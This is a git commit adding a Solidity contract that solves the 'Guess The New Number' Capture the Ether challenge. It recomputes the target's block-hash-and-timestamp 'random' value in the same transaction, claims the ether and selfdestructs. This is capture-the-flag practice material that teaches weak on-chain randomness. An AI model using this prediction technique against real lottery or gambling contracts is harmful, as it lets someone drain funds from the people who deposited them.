c2d41cc87734117ff457b070616fc6285ada15c4
mubarakone <52806204+mubarakone@users.noreply.github.com>
2021-10-20 21:27:12 -0700

    Create GuessTheNewNumberSOLVED.sol

---
+++ LOTTERIES/Guess The New Number/GuessTheNewNumberSOLVED.sol
@@ -0,0 +1,17 @@
+//      *****SOLVED***** 
+
+contract CaptureTheEther {
+    
+    function capture() public payable {
+        GuessTheNewNumberChallenge number = GuessTheNewNumberChallenge(/* INSERT CONTRACT ADDRESS */);
+        
+        // Copy the answer variable from guess() function to predict the hash value, then pass it through the function
+        number.guess.value(msg.value)(uint8(keccak256(block.blockhash(block.number - 1), now))) 
+        
+        selfdestruct(msg.sender); // Destroy this contract once the ether gets transfered
+    }
+    
+    function() public payable {
+        
+    }
+}
